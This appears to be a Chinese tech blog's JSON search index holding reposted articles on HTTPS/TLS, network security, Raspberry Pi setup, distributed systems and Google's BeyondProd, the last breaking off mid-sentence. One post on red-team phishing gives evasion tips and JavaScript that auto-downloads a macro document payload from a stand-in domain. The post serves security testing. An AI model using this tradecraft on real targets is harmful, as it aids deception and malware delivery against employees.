{"pages":[{"title":"BLOG","text":"记录生活中的琐碎 分享&amp;学习&amp;进步 ABOUT ME 重度懒癌患者 间歇性金鱼记忆 终身学习者","link":"/about/index.html"}],"posts":[{"title":"HTTPS Encryption Explained","text":"转载自微信公众号:车小胖谈网络 本文内容仅供学习交流，如有侵权立即删除。 QuestionⅠ 好比说邮箱，登录时进行HTTPS加密了，即使提交时保护了账户信息，但之后的请求，邮件服务器返回的网页源代码，信件内容不是都在上面吗？这些信息同时被加密了吗？ 纠正一点，这个世界上压根没有HTTPS这个协议。当我们提到HTTPS时，其实同时提到两个协议，一个是TLS，另外一个是HTTP，它们狼狈为奸抱团取暖，共同为用户提供安全(Security)访问网页（HTTP）的服务，缩写为HTTPS。 以大家从知乎网站拉取的网页为例，页面内容通常由N个IP报文组成，每一个IP报文的逻辑格式如下： IP TCP TLS HTTP 已加密 “HTTP”完全加密，只有数据的发送方、接收方有解密的密钥可以解开，任何第三方都无法解密获取明文的HTTP内容，因为没有密钥信息。 使用POP3/IMAP来接收邮件，安全邮件的接收格式如下： IP TCP TLS SMTP 已加密 使用POP3/IMAP来接收邮件，安全邮件的接收格式如下： IP TCP TLS POP3/IMAP 已加密 其实并不是，因为邮件传输有一个致命的弱点，即机会加密（Opportunistic Encryption）。 什么是机会加密？ 客户端通常会使用“STARTTLS”来尝试建立TLS安全连接，如果一切正常，邮件内容完全加密。 如果客户端尝试多次没有成功建立安全连接，客户端就会放弃使用TLS，而采用不加密的方式传输邮件，逻辑格式如下： IP TCP SMTP/POP3/IMAP 无加密 那么邮件的明文内容在传输过程中就被第三方窃取了，只要第三方可以捕获流量。 第三方为了不让通信双方建立TLS连接，通常在中间故意捣乱（丢包），TLS建立不起来，从而退而求其次选择明文传输。 QuestionⅡ 我访问了某https网站 ，运营商/HK/GFW能查或不能查到我的哪些信息？比如访问请求，提交表单的内容等等…… 凡是被HTTP包裹的内容全部是加密的、安全的。但运营商可以监控你的明文传输的DNS查询报文、以及TLS协商阶段的明文报文，这些明文信息（网站域名、SNI、数字证书Subject / Alternative Name**）会泄露你在访问哪些网站，仅此而已，更多的信息没有了。 以上的假设是运营商或其它第三方没有使用“中间人攻击”，如果他们伪造了一个你要访问网站的证书，但是却被你的浏览器验证合法，那么这就是一个成功的“中间人攻击”。你访问网站的所有信息，包括HTTP包裹的表单，都是可以被他们解密的，更不要说你的登录密码、Session ID、Access Token、Authentication Cookie了。 QuestionⅢ HK劫持到SESSIONID就能轻易的绕过登录，用HTTPS能否起到保护作用？ SESSION ID、Access Token、AuthenticationCookie等同于用户密码，这样我们就可以不要每次拉取一个页面，就输入一次密码，太繁琐了。有了以上证明用户身份的权限信息，是可以绕过登录过程，而无需输入密码。 可是以上信息都被TLS加密了，只有客户端、服务器才可以解密，其它第三方是无法获取的。要想获取这些机密信息，必须使用上文提到的中间人攻击，将TLS会话成功劫持，可以得到任何感兴趣的权限信息。 而要进行一次成功的中间人攻击，目前最最方便的手段就是“伪造一个在浏览器看来合法的证书”，这听起来有点荒唐，但真实世界就是这个样子！造成这一荒唐局面的是全球通用的公钥认证系统（PKI）的系统性缺陷。","link":"/2020/02/09/HTTPS-encryption-explained/"},{"title":"Network transmission security","text":"转载自微信公众号:车小胖谈网络 本文内容仅供学习交流，如有侵权立即删除。 计算机网络信息传输安全是如何保障的？无论是采用三层IPSec加密，四层TLS加密，七层的应用层加密技术，要想实现网络的传输安全，需要实现以下基本元素： 1.数据的机密性 通俗地说，就是一端将明文数据加密，另外一端将加密数据解密成明文，通常使用AES-CBC加密算法，需要双方有一个session key。 2.保证数据 在传输过程中，数据不被窜改，可以使用HMAC来校验，通常使用MD5或SHA算法，同样需要一个HMACkey。 3.防重放攻击 防止第三方捕获一个合法的密文，然后再重新发送一次。对付这种攻击，只需要消息体里有序列号、或时间戳保护即可。 4.数据流量大小的私密性防止第三方可以根据加密报文的字节数，推测可能的内容，可以将原始报文用废数据填充。以上是要实现的目标，但不要忘记一个大前提，通信双方需要互相认证、或单向认证，而实现认证的技术： 数字证书 预共享密码 而需要协议来承载以上的认证过程，我们需要控制协议来完成这项工作： IKE TLS Handshake 同时还可以使用这些控制协议来完成，通信两端的加密参数（加密算法、HMAC算法）的协商，以及key（session /HMAC)的协商，而key 的协商通常使用DH算法、RSA算法。实现了以上所有元素，就可以安全地传输数据了。以上是很早以前写的答案，其实一个字就概括了，这个字就是Key！ 问题来了，Key是干嘛的？当然是为了加密、签名，杜绝第三方偷窥、篡改报文。 Key是从哪里来呢？ 肯定是通信双方计算而来，这句话虽然是大实话，但是等于什么都没说，哈哈。。。Key是安全认证的副产品，一般认证完就会有一个Key的输出！比如你连接WIFI热点，你输入password 或者username/password, 一旦完成认证，紧接着通信双方就计算出了Key，然后就可以安全（使用加密Key加密）通信了，不是吗？再比如你使用https访问网站，只要认证完服务器的身份，随之就产生了Key，然后也可以实现安全通信。 你可能会有N多问题，为何要认证完才输出Key，难道不能先计算Key再来认证？或者压根不认证不可以吗？ 当然是可以的，但是你能知道和你通信的是谁吗？如果不知道，你会放心将自己的隐私信息放在网站服务器上吗？不认证当然是可以的，比如http网站，无需认证服务器的身份，你依然可以使用，但是这种通信时不安全的，因为没有加密、防篡改。但是有的时候并不是认证完了，就一定会输出Key，比如PPPoE拨号，服务器认证完你的身份，并没有输出什么Key，客户端与PPPoE服务器之间的通信也没有加密。其实输出Key时毫无压力的，之所以不输出，是因为PPPoE被设计得非常简单，只提供隧道服务，不提供安全加密服务。VXLAN也没有提供加密服务啊，第一次看到VXLAN封装格式，第一个想法是为何它不加密啊？过了若干年，好像突然领悟了。没有VXLAN的日子，信息传输的安全是如何实现的？小明站起来说：我们有IPSEC、TLS安全加密，所以即使VXLAN不加密，信息传输依然是安全的，这也符合协议设计的专业分工，隧道协议实现管道服务，安全协议实现信息安全传输服务！小明回答的很好，小丽你还有什么补充的？小丽补充说，其实没有IPSEC、TLS这些安全加密服务，现在很多软件本身已经实现了安全传输功能，比如文件共享、邮件传输等等。回答的很好，当然软件自身实现的安全加密，依然需要认证完身份，然后利用输出的Key来实现安全加密服务！当然光靠Key也无法实现所有的安全要素，比如你如何抵御报文重放攻击？那还是要利用时间戳、序列号、这种单向增长，与时间轴同步的技术手段可以有效抵御重放攻击！","link":"/2020/06/21/Network-transmission-security/"},{"title":"树莓派系统基本设置","text":"Raspbian 简介 Raspbian 是专门用于 ARM 卡片式计算机 Raspberry Pi® “树莓派”的操作系统。 Raspberry Pi® “树莓派”是 2012 年问世的 ARM 计算机，旨在为儿童和所有的计算机爱好者提供一套廉价的编程学习与硬件 DIY 平台。树莓派基于 ARM11，具有 1080P 高清视频解析能力，附带用于硬件开发的 GPIO 接口，使用Linux操作系统。售价仅 $25~$35。 Raspbian 系统是 Debian 7.0/wheezy 的定制版本。得益于 Debian从7.0/wheezy 开始引入的“带硬件浮点加速的ARM架构”(armhf)，Debian 7.0 在树莓派上的运行性能有了很大提升。Raspbian 默认使用 LXDE 桌面，内置 C 和 Python 编译器。 Raspbian 是树莓派的开发与维护机构 The Raspbeery Pi Foundation “树莓派基金会”，推荐用于树莓派的首选系统。 由于以下原因，Raspbian 需要单独组建软件仓库，而不能使用 Debian 的仓库： Debian下所有的软件包都需要用 armhf 重新编译。 树莓派有部分特有的软件包，例如 BCM2835 CPU 的 GPIO 底层操作库。 树莓派用户倾向于探索、尝试最新的软件。这与 Debian 软件源的策略完全不同。 切换到root用户1su root 修改Raspbian的软件源以便提供更快的下载速度官方认证的源列表123nano /etc/apt/sources.listnano /etc/apt/sources.list.d/raspi.listapt-get update &amp;&amp; apt-get upgrade 把原来的地址行删除或者注释掉然后直接按这个格式扔进去就行 sources.list 12deb 软件源地址 stretch main non-free contrib rpideb-src 软件源地址 stretch main non-free contrib rpi raspi.list 12deb 软件源地址 stretch main uideb-src 软件源地址 stretch main ui 中文支持及中文输入法12apt-get install -y ttf-wqy-zenheiapt-get install -y scim-pinyin","link":"/2019/02/05/Raspberry-Pi1/"},{"title":"树莓派系统安装","text":"0X00 硬件准备 Raspberry Pi3 一个 TF储存卡 推荐16GB的高速卡 路由器 一台 电脑 已连接到路由器 软件准备 SD Card Formatter 点击下载(Windows版本) Win32 Disk Imager 点击进入下载链接 树莓派镜像 点击进入下载链接 推荐这个带软件集成的桌面版本 0X01 使用SD Card Formatter格式化SD卡 Win32DiskImager写入树莓派镜像 设置无线网连接由于新版本的Raspbian系统镜像默认禁用了SSH服务所以我们首先要在TF卡分区中创建ssh(空文件)以便开启SSH远程并且新建wpa_supplicant.conf按照以下的提示写入1234567891011121314151617181920212223242526country=CNctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdevupdate_config=1// 没有密码network={ssid=&quot;ssid&quot;key_mgmt=NONEpriority=1}// WEP加密network={ssid=&quot;你的无线网络名称（ssid）&quot;key_mgmt=NONEwep_key0=&quot;wifi密码&quot;priority=1}// WPA/WPA2加密network={ssid=&quot;你的无线网络名称（ssid）&quot;key_mgmt=WPA-PSKpsk=&quot;wifi密码&quot;priority=1} 开启强制HDMI输出在TF卡分区中打开config.txt修改以下参数： 12345hdmi_safe=1config_hdmi_boost=4hdmi_ignore_edid=0xa5000080hdmi_group=2hdmi_mode=82 项 含义 hdmi_safe=1 安全启动HDMI config_hdmi_boost=4 开启热插拔 hdmi_group=1 CEA电视显示器 hdmi_group=2 DMT电脑显示器 hdmi_ignore_edid=0xa5000080 忽略自动探测的分辨率 输出分辨率： hdmi_mode=4 640x480 60Hz hdmi_mode=9 800x600 60Hz hdmi_mode=16 1024x768 60Hz hdmi_mode=82 1080p 60Hz 0X02 通电测试以上修改完毕后把TF卡插入树莓派的TF卡插槽内，接上支持输出5V-2A的充电器，正常情况下稍过一会就可以直接在路由器的管理界面看到树莓派的设备。接着我们直接用ssh连接，这里我用的是Xshell点击新建在主机栏填入树莓派的IP地址，端口默认为22用户名和密码默认为：piraspberry连接成功后，可以直接看到树莓派命令行界面。","link":"/2019/02/02/Raspberry-Pi/"},{"title":"树莓派系统基本设置","text":"Raspbian 简介 Raspbian 是专门用于 ARM 卡片式计算机 Raspberry Pi® “树莓派”的操作系统。 Raspberry Pi® “树莓派”是 2012 年问世的 ARM 计算机，旨在为儿童和所有的计算机爱好者提供一套廉价的编程学习与硬件 DIY 平台。树莓派基于 ARM11，具有 1080P 高清视频解析能力，附带用于硬件开发的 GPIO 接口，使用Linux操作系统。售价仅 $25~$35。 Raspbian 系统是 Debian 7.0/wheezy 的定制版本。得益于 Debian从7.0/wheezy 开始引入的“带硬件浮点加速的ARM架构”(armhf)，Debian 7.0 在树莓派上的运行性能有了很大提升。Raspbian 默认使用 LXDE 桌面，内置 C 和 Python 编译器。 Raspbian 是树莓派的开发与维护机构 The Raspbeery Pi Foundation “树莓派基金会”，推荐用于树莓派的首选系统。 由于以下原因，Raspbian 需要单独组建软件仓库，而不能使用 Debian 的仓库： Debian下所有的软件包都需要用 armhf 重新编译。 树莓派有部分特有的软件包，例如 BCM2835 CPU 的 GPIO 底层操作库。 树莓派用户倾向于探索、尝试最新的软件。这与 Debian 软件源的策略完全不同。 切换到root用户1su root 修改Raspbian的软件源以便提供更快的下载速度官方认证的源列表123nano /etc/apt/sources.listnano /etc/apt/sources.list.d/raspi.listapt-get update &amp;&amp; apt-get upgrade 把原来的地址行删除或者注释掉然后直接按这个格式扔进去就行 sources.list12deb 软件源地址 stretch main non-free contrib rpideb-src 软件源地址 stretch main non-free contrib rpi raspi.list12deb 软件源地址 stretch main uideb-src 软件源地址 stretch main ui 中文支持及中文输入法12apt-get install -y ttf-wqy-zenheiapt-get install -y scim-pinyin","link":"/2019/02/05/Raspberry-Pi1_Config/"},{"title":"提高钓鱼成功率","text":"转载自微信公众号:信安之路 本文内容仅供学习交流，如有侵权立即删除。 在红蓝对抗当中，钓鱼攻击被越来越多的红队使用，因为员工的安全意识薄弱，导致钓鱼成功的可能性很大，因为钓鱼事件导致内网被入侵的事件比比皆是，作为红队的一员做钓鱼测试的时候，如何提升钓鱼成功率，可以看看以下七点建议。 1.不直接将 payload 放置邮件内容可以将 payload 放在自己的服务器上，通过访问服务器的方式加载 payload 使用的钓鱼 url 最好做一下 url 重写，例如使用： 1https://phishy.domain/company/code/a2ef362e-45d0-b21d-5abf-edce29d365cb/) 而不是： 1https://phishy.domain/company/index.php 可以用下面的方式配置 apache 的 url 重写： 1234RewriteEngineOnRewriteCond%{REQUEST_FILENAME} !-fRewriteCond%{REQUEST_FILENAME} !-dRewriteRule ^(.*)$ index.php [L,QSA] 2.不直接在邮件内容中添加恶意附件可以通过嵌入 html、js 等方式进行恶意文件加载，html 方式如： 123&lt;ahref=&quot;https://phishy.domain/payload.docm&quot;&gt;download the code of conduct&lt;/a&gt; javascript 的方式如： 12345678&lt;aid=&quot;download&quot;href=&quot;#&quot;&gt;download the code of conduct&lt;/a&gt;&lt;script&gt;document.getElementById(&quot;download&quot;).onclick = function() {document.location = &quot;https://phish&quot; + &quot;y.domain/pay&quot; + &quot;load.docm&quot;; };document.getElementById(&quot;download&quot;).click();&lt;/script&gt; 3.钓鱼域名使用过期域名申请的域名最怕的是已经被安全产品标记为恶意，所以在申请域名的时候，可以去找一些刚过期的域名，为了迷惑对手，可以尝试根据关键词来搜索过期域名，然后进行注册，提升钓鱼的成功率，下面的网站是可以查询过期域名的： https://www.expireddomains.net/backorder-expired-domains/ 如下工具可以直接输入关键词就可以获得一些相似的过期域名信息，项目地址： https://github.com/Mr-Un1k0d3r/CatMyPhish 4.搭建钓鱼网站尽量使用 https因为浏览器会将使用 http 的网站标记为不安全，我们可以申请一些免费的 https 证书，给自己的钓鱼网站添加正常的证书，更具有迷惑性。 5.钓鱼内容尽量无趣在企业内部经常会收到一些规章制度的邮件、或者内部发布的一些无聊且需要执行的邮件内容，大家在看到邮件内容的时候，不会过多的关注，可能默默的就完成了提示的操作，这样可以减少大家互相讨论导致的钓鱼行为被暴露的风险。 6.尽可能使用第三方的子域名如果有正常网站的子域名可以用，尽量使用，因为这类域名通常不会被安全软件标记为恶意域名，在大众的心理也会比较信任，比如那些提供二级或者三级域名使用的云服务。 7.每次使用的域名尽量不复用在被安全公司分析出域名存在恶意行为之后，会被标记并加入威胁情报当中，如果复用该域名，很有可能被安全软件命中威胁情报，从而提前暴露钓鱼行为，导致钓鱼测试失败。 总结以上是作为攻击方需要注意的几点，而作为防守方，需要做的事情更多，比如提升全民安全意识、邮件安全网关、网络层入侵检测、主机层入侵检测、终端安全等，每个环节都需要进行重点防御。对于员工安全意识提升方面，以攻促防，通过多次实际的钓鱼模拟测试来提升员工对钓鱼邮件的免疫能力，这是一个艰难而又漫长的过程。","link":"/2020/09/22/提高钓鱼成功率/"},{"title":"Everything is distributed","text":"转载自: https://arthurchiao.github.io/ 本文内容仅供学习交流，如有侵权立即删除。 译者序本文内容来自 2015 年的一本小册子 Everything is distributed（下载 Free-OReilly-Books）， 其中集合了 5篇与性能和运维相关的文章，本文翻译其中第二篇 Everything is distributed。这篇文章思考有一定深度，但部分观点恐怕失之颇偏，比如作者认为分布式系统中的故障没 有根本原因（There is no root cause）、查找 root cause 多半是徒劳等等。 由于译者水平有限，本文不免存在遗漏或错误之处。如有疑问，请查阅原文。 人们应该感到惊讶的并不是每天都有这么多故障，而是每天只有这么少故障。你不应该惊 讶于自己的系统偶尔会崩溃，而应该惊讶于它竟然能长时间不出错地运行。 — Richard Cook 2007 年 9 月，76 岁的 Jean Bookout 正在 Oklahoma 一条陌生的道路上驾驶着她的丰田 凯美瑞，她的朋友 Barbara Schwarz 坐在副驾驶的位置。突然，这辆汽车自己开始加速。 Bookout 尝试了踩刹车、拉手刹，但都不管用，汽车还是继续加速。最后这辆车撞上了路堤 ，造成 Bookout 受伤，Schwarz 死亡。在随后的法律程序中，丰田的律师将事故原因指向 此类事故最常见的罪魁祸首：人为失误（human error）。“人们有时会在开车时犯错” ，其中一位律师宣称。Bookout 年纪很大了，而且也不是她熟悉的路，因此造成了这场悲剧 。 然而，近期一个针对丰田的 产品可靠性测试 却令这件事情有了一个 180 度的大转弯：凯美瑞中的一个软件 bug 导致的栈溢出错误（ stack overflow error）才是此次事故的罪魁祸首。下面两方面原因使得这一事件非常重要： 此类事故最常见的背锅侠 —— 人为失误 —— 最后确认并不是造成这次事故的原因（ 这个假设本身就是有问题的）。 这件事展示了我们如何从 一个软件错误导致的小故障或（潜在更大的） 公司营收损失，无缝跨越到了 人身安全 的领域。 要将这件事情往小里说可能也容易：（目前）在某款特定车型搭载的软件中似乎发现了一个常见 bug 。 但这件事的外延要 有趣地多。考虑一下目前发展地如火如荼的自动驾驶汽车。自动驾驶消除了人为失误 这个背锅侠，那我们得到的结论将是：在很多方面，自动驾驶汽车要比传统汽车更加安全。 但事实真是这样吗？考虑下面的情况： 如果发生了完全在汽车自动驾驶系统控制之外的事将会怎样？ 如果训练汽车识别红绿灯的数据有错误怎么办？ 如果 Google 地图让它去做一些明显很愚蠢的事，并且这些事很危险怎么办？ 我们已经到达了软件开发中的一个特殊点 —— 不管是在技术上还是在社会/组织上，到 了这个点我们不再能理解、看到、或控制系统的所有组件 —— 我们的软件正在变得越来越复 杂和分布式。软件行业本身已经变成一个分布式的、复杂的系统。 我们如何开发和管理那些庞大到无法理解、复杂到无法控制、出错方式也无法预测的系统？ 拥抱故障分布式系统曾经只是计算机科学博士和软件架构师的领地，受众非常小。但现在不同了。 仅仅因为你在笔记本电脑上写程序、无需关心消息如何传递和锁问题，并不意味着你不 需要关心分布式系统： 你写的程序发起了多少对外部服务的 API 调用？ 你的代码是跑在PC 上还是移动设备上 —— 你确切地知道所有可能的设备类型吗？ 当你的应用正在运行时，它可能遇到哪些网络方面的限制，关于这些你知道多少？ 当软件到达特定规模时，它会遇到哪些瓶颈，关于这些你又知道多少？ 在经典分布式计算理论中，我们学到的一件事情是：分布式系统经常会发生故障，而且 大都是局部而非全局故障。这些故障不仅难于诊断和预测，而且很难复现 —— 可 能是某个特定的第三方数据流没数据了，可能是位于某个你从未听说过的地方的路由器挂掉 了。你永远在同短时故障（intermittent failure）作斗争，这注定是一场失败的战役 吗？ 应对复杂分布式系统的方法并不是简单地增加测试，或者采用敏捷开发流程，也不是采用 DevOps 或者持续交付（continuous delivery）。任何单一的技术或方法都无法阻止类似 丰田汽车事故这样的事情再次发生。实际上，类似这样的事情肯定会再次发生。 解决这类问题我们需要拥抱这样一种观念：无法预知的故障种类太多了 —— 我们面对的是一 片巨大而未知的未知海洋；此外，还需要改变我们构建系统时 —— 以及运维现有系统时 —— 的思考方式。 分布式设计，本地化开发好了，现在我们可以确定的一点是：每个编写或开发软件的人都需要像分布式系统工程师 一样去思考。但这句话到底意味着什么？在实际中，它意味着：丢弃那种单计算机（节 点）的思考模式（single-computer mode of thinking）。 直到最近，我们才可以将计算机视为一个相对确定性的东西（a relatively deterministic thing）。当编写一个在某台机器上运行的代码时，我们能够确定性地假设很多东西，例如 ，内存查询的方式。但现在已经没有应用还运行在单台机器上了 —— 云就是这个时代的计 算机（the cloud is the computer now），它就像一个生命系统（living system），一 直在持续不断地变化，尤其是在越来越多的公司开始采用持续交付这种新范式的过程中。 因此，你必须开始： 接受这样的假设：支撑你的软件运行的系统一定会发生故障 对为什么会发生故障以及故障可能会以怎样的形式发生做出预案 针对这些预案设计数据收集方案 这并不是像说一句“我们需要更多测试”那么简单。传统的测试哲学中，假定 所有测试用例都是能够描述出来的，但在分布式系统中这一点不再成立。（这并不是说 测试不重要了，而是说测试不再是万灵药。） 当处于一个分布式环境、并且大部分故障模 式都是无法提前预测也无法测试时，监控就成了唯一的理解应用行为的方式。 数据是分布式系统的通用语言如果对刚才的比喻（复杂系统就像一个生命系统）进行延伸，那在 诊断出一个人中风后 才去寻找病因 与 在中风前就能及早发现问题 明显是两种方式。你当然可以翻阅病 例上的就诊记录，从中看出其实早有中风的苗头，但你更需要的是一个早期告警系统， 以及一种在问题刚发生时就能看到并尽可能快地介入处理的方式。 另外， 历史数据只能告诉你哪里出了问题，并且是局限在特定时间段内的问题。但在处理分布 式系统相关的问题时，需要关心的事情要比仅仅 ping 一下服务器通不通多多了。 与测量和监控相关的工具现在已经有很多，这里不会就具体工具展开讨论，而是要告诉你： 在查看自己的应用和系统的监控数据的过程中，你会对“直方图通常比平均值更能说明问 题”有越来越深的理解，在这个过程中开发者不会再将监控视为纯粹是系统管理员的领域。 复杂系统中人的角色无论多么复杂的软件最终都是人写出来的。 任何对分布式系统和复杂度管理的讨论最终都必须承认 人在我们设计和运行的系统中 的角色。人是我们创造出来的复杂系统中不可分割的一部分，而且很大程度上我们要对他 们的多样性（variability ）和适应性（resilience ）负责（或对他们缺乏这两种特性负 责）。 作为复杂系统的设计者、建造者和运营者，我们受一种厌恶风险（risk-averse）文化 的影响，不管我们是否意识到这一点。在试图（在进程、产品或大型系统中）避免故障的过 程中，为了使自己能够有更多“把控”（control），我们倾向于粗细不分地列出需求（ exhaustive requirements）和创建紧耦合（tight couplings），但这种方式经常 更容易导致故障，或者产生更脆弱的系统。 当系统发生故障时，我们的方式是责备（blame）。我们粗鲁地寻找所谓的故障“原因” —— 实际上，相比于寻找真正原因以避免将来再出现类似问题，这种所谓的寻找故障“原因”的 过程经常只是一个减轻负罪感和寻求内心平静的活动。这类活动通常会导致人们继续加强对 系统的“把控”，而结果是最终的系统更加脆弱。 这里的现实是：大部分大故障都是一连串小故障叠加的结果，最终触发了某个事件（most large failures are the result of a string of micro-failures leading up to the final event）。这些故障并没有根本原因（There is no root cause）。我们最好不 要再去试图寻找根本原因了，这样做只是在攀登文化期望（cultural expectations）和强 大且根深蒂固的心理本能（psychological instincts）的悬崖峭壁。 20 世纪 80 年代奏效的流程和方法论，到了 90 年代已略显落后，现在更是完全不适用了 。我们正在探索新的领地和模型，以构建、部署和维护软件 —— 以及开发软件的组织自身（ organizations themselves） 。","link":"/2020/02/06/Everything-is-distributed/"},{"title":"BeyondProd","text":"转载自: https://arthurchiao.github.io/ 本文内容仅供学习交流，如有侵权立即删除。 译者序本文翻译自 2019 年 Google 的一篇白皮书 BeyondProd: A new approach to cloud-native security， 介绍了其最新的云原生安全模型。 Google 虽有官方中文版，但机器翻译痕迹略重，相比原文反而增加阅读障碍；故有此拙译 ，仅供个人学习交流（排版略有调整，以方便网页阅读）。 由于译者水平有限，本文不免存在遗漏或错误之处。如有疑问，请查阅原文。 以下是译文。 Google 此前的几篇白皮书已经介绍我们内部开发的一些增强安全性的项目。从命名来说 ，BeyondProd 是有意让人回想起我们先前的另一个概念 BeyondCorp —— 就像边界安全模型（perimeter security model）不再适用于终端用户（end users）一样，它 也不再适用于微服务场景。因此，套用最初 BeyondCorp 论文 中的句子，我们可以说：“… 本模型的核心假设不再成立：边界不再仅限于企业的 物理位置 [数据中心]，边界内的东西不再是免检的（blessed），边界内也不再 是一个能够安全地存放 个人计算设备和企业应用 [微服务]的地方。” 本白皮书介绍 Google 基础设施的多个组件是如何协同工作来保证负载（workload）安全的 —— 我们所使用的架构如今被称为“云原生”（cloud-native）架构。如果想对 Google 安全有一个整体了解，推荐阅读 Security Infrastructure Design whitepaper。 本文内容截止 2019 年 12 月还是有效的。本白皮书介绍直至本文写作时 BeyondProd 的 现状。Google Cloud 的安全策略和系统可能会随着时间发生变化，正如我们会持续提高 对用户的安全保护一样。 术语（Glossary）本文将用到以下术语： 微服务（microservice）：微服务将一个应用需要执行的多个独立任务（ individual tasks）拆分为单独的服务（separate services），每个服务都有自己 的 API、独立开发、维护、发布、扩容和管理配额。 在更加现代的架构中，应用（例如一个网站）是以一系列微服务（a collection of microservices）的形式而非单个单体服务（single monolithic service）的方式运行的。 微服务是独立的、模块化的、动态的、生命周期较短的（ephemeral）。微服务能够分布到不同的机器上，不同的集群中，甚至不同的云上。 负载（workload）：一个 workload 就是应用完成的一个特定任务（a unique task that an application completes）。 在微服务架构中，一个 workload 可能是一个或多个微服务。 作业（job）：一个 job 是微服务的一个实例（a single instance of a microservice），执行应用的一部分功能（running some part of an application）。 服务身份（service identity）：在基础设施中，微服务之间使用服务身份做认证。 服务网格（service mesh）：service mesh 是一个服务之间通信（service-to-service communication）的基础设施层（infrastructure layer），能够控制流量、应用策略， 提供中心式的服务调用监控。 微服务引入 service mesh 之后能够降低每个服务的开发负担，因为它们不再需要自己费力地实现一遍这些功能；另外，service mesh 还使得微服务之间的管理更加简单，也更加集中。 首席信息官必读（CIO-level summary） Google 基础设施中，每个 workload 都作为独立的微服务部署（deploys workloads as individual microservices），在虚拟化层使用容器，并使用我们的容器编排系统 Borg 来管理这些 workloads。如今火爆业界的“云原生”架构，就是从 Borg 得到灵感 ，并参考了其设计。 Google 基础设施在设计时就考虑了安全，而不是事后加的。 我们假设服务之间是无信任的（no trust between services）。 Google 基于名为 BeyondProd 的方案保护微服务安全。该方案包括代码如何变更 ，以及如何访问微服务内的用户数据。 BeyondProd 应用了如下概念： 双向认证微服务端点（mutually authenticated service endpoints） 传输安全（transport security） 带 GSLB 和 DoS 防护功能的边界终止（edge termination with global load balancing and denial of service protection） 端到端代码来源验证（end-to-end code provenance） 运行时沙盒（runtime sandboxing） 从传统安全模型迁移到云原生安全模型，主要涉及两方面改动：基础设施和开发过程 （infrastructure and development process） 将共享的组件（components）打造成一个共享的交换网格（fabric，在数据中心 网络中通常表示全连接的交换矩阵，译者注），用这个 fabric 将所有微服务的通信连接起来（enveloping and connecting），即所谓的 service mesh，会使得发布变更（roll out changes）和获得一致的安全性（consistent security across services）更加容易。 设计动机（Motivation）出于下面几个原因： 获得更高的资源利用率 构建高可用的应用 简化 Google 开发者的工作 我们迁移到了容器和容器编排平台。 除此之外，我们迁移到容器化的基础设施还有一个初衷：将安全控制和架构进行对齐 （align our security controls with our architecture）。 我们已经很清楚地知道，基于边界的安全模型（perimeter-based security model）并非足 够安全。攻击者一旦攻破了边界，就能够在网络内部任意游走。我们意识到需要在基础设施中引入更强的安全控制，但也希望这些控制对 Google 开发者是友好的：他们能够轻 松地编写和部署安全的应用，而不用亲自实现安全特性。 从单体应用迁移到容器化的分布式微服务，并基于容器编排系统来编排这些服务，带来了两 方面好处，并且这两方面相互交织： 管理更简单 可扩展性更好 这种云原生架构需要一种不同的安全模型，以及不同的工具来保护应用部署，以便与微服务的管理和扩展性收益相匹配。 本文描述 Google 是如何实现云原生安全（即 BeyondProd）的，包括： 向云原生的转变，对安全意味着什么（what the change to cloud-native means for security） 云原生安全的安全原则（security principles） 为满足这些需求所构建的系统 一些指导原则，基于这些原则你也能构建一套类似的安全控制 Google 的云原生安全容器化的微服务Google 在初期就有意识地用价格低廉的普通服务器而非昂贵的高可用硬件构建自己的数据 中心。我们的可靠性指导哲学是 —— 并且将一直是：允许系统的任何部分发生故障 ，但不能对用户可见的服务产生影响。 达到这个可用性目标就需要部署冗余实例，这样单个实例挂掉时服务仍然可用。这种哲学的成果之一是：我们开发了容器、微服务和容器编排系统，以便可扩展地管理这些高冗 余和分布式系统的部署。 容器化的基础设施意味着，每个 workload 都自成一体，作为一组容器部署，这些容器具有 不可变（immutable）、可移动（moveable）、可调度（scheduleable）的特点。为了管理这些容器，我们开发了一个称为 Borg [1] 的容器编排系统，现在我们仍然在使用，每周部署几十亿个容器。 容器的部署方式使得 workload 二进制文件打包（bin pack）和在机器间重调度（ reschedule across machines）更方便。微服务使得开发和调试应用的某个部分更方便。这两者结合起来，微服务和容器使得 workloads 能够拆分为更小的、更易维护和发现的单元。 迁移到基于容器化基础设施的微服务架构， 即如今所谓的向 “云原生” 转变（going “cloud-native”）。 服务都运行在容器内，由 Borg 部署。这种架构能根据 workload 大小自动扩缩容：如果某 个 workload 请求量很大，可能就会扩出多个实例来分担请求。 Google 做得比较出色的一点是：安全作为重要组成部分，在历次架构演进过程中都会考虑到。比如我们已经使用多年的保护基础设施安全的 BeyondCorp 模型，以及近期的云原生安全（cloud-native security）概念。 采用这种微服务架构和开发流程的目标是：在开发和部署生命周期中，尽量早地解决安全问题 —— 越早解决代价越小 ——并且解决安全问题的方式要标准和一致（standardized and consistent）。最终结果是，开发者无需在安全上花太多时间，而仍然能获得更多的安 全性保证（spend less time on security while still achieving more secure outcomes ）。 迁移到云原生架构传统的基于边界的安全模型中，防火墙保护着网络边界，所有用户和服务都位于边界之内并 且是完全受信任的。这种模型已经无法满足现代安全架构（modern security architectures）的需求。 现代企业中，用户的工作方式已经发生了变化，为了应对这种变化，我们之前提出了 BeyondCorp 模型。如今，用户都是移动办公的，工作地点经常会在公司的传统安全边界之 外，例如咖啡厅、飞机上，或者其他任何地方。在 BeyondCorp 中，我们弃用了特权企业网络（privileged corporate network）的概念，访问认证（authorized access）只依赖设备、用户凭证和属性（device and user credentials and attributes），而不关心用户（接入时）的网络位置（network location）。 云原生安全的理念与此类似，只不过关注点从用户（users）变成了服务（services ） —— 在云原生世界里，我们不能仅简单地依赖防火墙来保护生产网络（production network），正如我们不能依赖防火墙保护企业网络（corporate network）。 进一步，我们可以做如下对比： 企业网络中：不同的用户可能从不同的物理位置、通过不同的设备访问企业网络。 生产网络中：不同的开发者可能会将应用发布到不同的生产环境。在 BeyondProd 模型中，微服务可能会运行在有防火墙保护的数据中心、公有云、私有云， 或者第三方托管的服务商，而这些环境都是需要安全保护的。 另外， 企业网络中：用户会移动，使用不同设备，从不同位置接入。 生产网络中：微服务会移动，部署在不同环境中，跨异构机器（heterogeneous hosts）。 BeyondCorp 中提到， “用户信任（user trust）应依据设备的可感知上下文的状态等信息，而不应依据能否连接到企业网络”。 ” should be dependent on characteristics like the context-aware state of devices and not the ability to connect to the corp network” 类似地理念在 BeyondProd 中表述为， “服务信任（service trust）应依据代码来源和服务身份等信息，而不应依据在生产网络中的位置，例如 IP 或 hostname identity”。 “service trust should be dependent on characteristics like code provenance and service 